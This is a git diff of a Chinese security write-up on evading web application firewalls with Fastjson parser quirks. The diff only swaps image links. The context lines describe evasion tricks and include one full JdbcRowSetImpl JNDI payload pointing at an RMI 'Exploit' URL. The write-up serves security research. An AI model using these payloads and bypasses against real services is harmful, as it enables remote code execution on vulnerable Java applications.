@@ -50,7 +50,7 @@ public final void skipWhitespace() {
 
 FastJson中有个默认的Feature是开启的`AllowArbitraryCommas`，这允许我们用多个逗号
 
-![](https://y4tacker.github.io/2022/03/30/year/2022/3/%E6%B5%85%E8%B0%88Fastjson%E7%BB%95waf/e2.png)
+![](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/2b5a4671f29c6ac20225960199f24ad3.png)
 
 这里可以添加的位置很多
  ```json 
@@ -63,7 +63,7 @@ FastJson中有个默认的Feature是开启的`AllowArbitraryCommas`，这允许�
 
 也是一个默认开启的Feature，`AllowUnQuotedFieldNames`，但是只在恢复字段的过程调用当中有效果
 
-![](https://y4tacker.github.io/2022/03/30/year/2022/3/%E6%B5%85%E8%B0%88Fastjson%E7%BB%95waf/e4.png)
+![](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/b6cba4c45d441792e1338269f3857e01.png)
 
 因此原来的payload可以做此改造
 
@@ -78,7 +78,7 @@ FastJson中有个默认的Feature是开启的`AllowArbitraryCommas`，这允许�
 
 主要是一个逻辑问题
 
-![](https://y4tacker.github.io/2022/03/30/year/2022/3/%E6%B5%85%E8%B0%88Fastjson%E7%BB%95waf/e3.png)
+![](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/7c9b80f7d01281c3a92af85a889975b4.png)
 
 这里我们可以对比之前获取`@type`的过程，先检验了当前位置是`"`再扫描到下一个`"`之间的值
 
@@ -92,7 +92,7 @@ FastJson中有个默认的Feature是开启的`AllowArbitraryCommas`，这允许�
 
 首先在`com.alibaba.fastjson.parser.JSONLexerBase#scanSymbol`,当中可以看见，如果遇到了`\u`或者`\x会有解码操作`
 
-![](https://y4tacker.github.io/2022/03/30/year/2022/3/%E6%B5%85%E8%B0%88Fastjson%E7%BB%95waf/e1.png)
+![](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/a097269ab7b798096cc715807500f148.png)
 
 还可以混合编码，这里一步到位
 
@@ -107,7 +107,7 @@ FastJson中有个默认的Feature是开启的`AllowArbitraryCommas`，这允许�
 
 解析字段的key的时候，调用了`smartMatch`，下面截了与本主题相关的关键点
 
-![](https://y4tacker.github.io/2022/03/30/year/2022/3/%E6%B5%85%E8%B0%88Fastjson%E7%BB%95waf/e5.png)
+![](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/282eae1065dec38f335e66ae6df42185.png)
 
 由于这里有`break`，不支持两个一起混合使用，只能单一使用其中一个，随便加
 
@@ -118,21 +118,21 @@ FastJson中有个默认的Feature是开启的`AllowArbitraryCommas`，这允许�
 
 我们再来看这个`smartMatch`调用了`com.alibaba.fastjson.util.TypeUtils#fnv1a_64_lower`
 
-![](https://y4tacker.github.io/2022/03/30/year/2022/3/%E6%B5%85%E8%B0%88Fastjson%E7%BB%95waf/e6.png)
+![](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/b6955a62c4b837588d3ca6c31e233265.png)
 
 这个函数忽略所有的`_`与`-`
 
-![](https://y4tacker.github.io/2022/03/30/year/2022/3/%E6%B5%85%E8%B0%88Fastjson%E7%BB%95waf/e7.png)
+![](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/d710f267d35cba01798324410971e76a.png)
 
 因此简单测试，lol
 
-![](https://y4tacker.github.io/2022/03/30/year/2022/3/%E6%B5%85%E8%B0%88Fastjson%E7%BB%95waf/e8.png)
+![](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/23e6785f87a57bc35e43dd55b8a318d0.png)
 
 ### 1.2.36版本后可以对属性前添加is
 
 在那个基础上,还是在`smartMatch`当中可以看见，如果前缀有`is`，会去掉`is`
 
-![](https://y4tacker.github.io/2022/03/30/year/2022/3/%E6%B5%85%E8%B0%88Fastjson%E7%BB%95waf/e9.png)
+![](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/92dfc806b16b85f652d91f9b1956ed08.png)
 
 | ```java 1 ``` | ```java {"a": {"@type": "java.lang.Class","val": "com.sun.rowset.JdbcRowSetImpl"},"b": {"@type": "com.sun.rowset.JdbcRowSetImpl","isdataSourceName": "rmi://127.0.0.1:1099/Exploit","isautoCommit": true}} ``` |
 | --- | --- |
@@ -162,15 +162,15 @@ FastJson中有个默认的Feature是开启的`AllowArbitraryCommas`，这允许�
 
 从代码出发开局初始化`DefaultJSONParser`的时候，由于我们字符串开头是`/`，会调用`netToken`
 
-![](https://y4tacker.github.io/2022/03/30/year/2022/3/%E6%B5%85%E8%B0%88Fastjson%E7%BB%95waf/s0.png)
+![](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/56cf2a1c574ca99fb7dc9c30221bf147.png)
 
 这里会调用`skipComment`去除注释
 
-![](https://y4tacker.github.io/2022/03/30/year/2022/3/%E6%B5%85%E8%B0%88Fastjson%E7%BB%95waf/s1.png)
+![](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/b095d332049917dad85c210758de56f3.png)
 
 可以看见如果是正常逻辑匹配到`*/`只是移动到下一字符返回
 
-![](https://y4tacker.github.io/2022/03/30/year/2022/3/%E6%B5%85%E8%B0%88Fastjson%E7%BB%95waf/s2.png)
+![](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/dbb422f9ab64886e082a6d37f4883bb7.png)
 
 之后继续处理正常逻辑
 
